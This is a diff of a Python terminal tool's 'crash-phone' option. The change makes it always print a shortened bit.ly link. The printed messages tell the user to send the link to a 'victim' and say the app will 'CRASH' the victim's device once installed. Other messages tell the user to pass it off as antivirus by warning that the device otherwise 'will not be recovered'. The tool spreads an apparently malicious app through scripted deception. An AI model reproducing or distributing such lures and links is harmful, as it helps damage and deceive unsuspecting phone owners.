@@ -155,8 +155,8 @@ if a=="crash-phone" or a=="Crash-Phone" or a=="CRASH-PHONE" or a=="crash phone" 
 					print(lie,end="")
 				time.sleep(10)
 				print("\n")
-				cho=["https://bit.ly/3ild93L",""]
-				print(green+"["+cyan+"+"+green+"]"+cyan+bold+"Link: "+fari+random.choice(cho))
+				cho=("https://bit.ly/3ild93L")
+				print(green+"["+cyan+"+"+green+"]"+cyan+bold+"Link: "+fari+bold+cho)
 			#choice=["https://bit.ly/3fX8ljZ","","Network Error",""]
 				print("")
 				t=(green+"["+cyan+"-"+green+"]"+yellow+bold+"Say Nothing To Him.\nWhen He Install It In His Device It Will Be "+red+bold+"CRASH!!!"+green+"["+cyan+"-"+green+"]\n")
@@ -192,8 +192,8 @@ if a=="crash-phone" or a=="Crash-Phone" or a=="CRASH-PHONE" or a=="crash phone" 
 					print(lie,end="")
 				time.sleep(5)
 				print("\n")
-				cho=["https://bit.ly/3ild93L",""]
-				print(green+"["+cyan+"+"+green+"]"+cyan+bold+"Link: "+fari+random.choice(cho))
+				cho=("https://bit.ly/3ild93L")
+				print(green+"["+cyan+"+"+green+"]"+cyan+bold+"Link: "+fari+bold+cho)
 			#choice=["https://bit.ly/3fX8ljZ","","Network Error",""]
 				print("")
 				t=(green+"["+cyan+"-"+green+"]"+yellow+bold+"Say Nothing To Him. When He Install It In His Device It Will Be "+red+bold+"CRASH!!!"+green+"["+cyan+"-"+green+"]\n")
@@ -282,8 +282,8 @@ if a=="crash-phone" or a=="Crash-Phone" or a=="CRASH-PHONE" or a=="crash phone" 
 					print(lie,end="")
 				time.sleep(10)
 				print("\n")
-				cho=["https://bit.ly/3fX8ljZ",""]
-				print(green+"["+cyan+"+"+green+"]"+cyan+bold+"Link: "+fari+random.choice(cho))
+				cho=("https://bit.ly/3fX8ljZ")
+				print(green+"["+cyan+"+"+green+"]"+cyan+bold+"Link: "+fari+bold+cho)
 			#choice=["https://bit.ly/3fX8ljZ","","Network Error",""]
 				print("")
 				t=(green+"["+cyan+"-"+green+"]"+yellow+bold+"Send It Your Victim And Tell Him That He Should Install This Application or His Device Will Not Be Recovered (Antivirus). You "+green+bold+"SAVE IT!!!"+green+"["+cyan+"-"+green+"]\n")
@@ -319,8 +319,8 @@ if a=="crash-phone" or a=="Crash-Phone" or a=="CRASH-PHONE" or a=="crash phone" 
 					print(lie,end="")
 				time.sleep(5)
 				print("\n")
-				cho=["https://bit.ly/3fX8ljZ",""]
-				print(green+"["+cyan+"+"+green+"]"+cyan+bold+"Link: "+fari+random.choice(cho))
+				cho=("https://bit.ly/3fX8ljZ")
+				print(green+"["+cyan+"+"+green+"]"+cyan+bold+"Link: "+fari+bold+cho)
 			#choice=["https://bit.ly/3fX8ljZ","","Network Error",""]
 				print("")
 				t=(green+"["+cyan+"-"+green+"]"+yellow+bold+" Send It Your Victim And Tell Him That He Should Install This Application or His Device Will Not Be Recovered (Antivirus). You "+green+bold+"SAVE IT!!!"+green+"["+cyan+"-"+green+"]\n")
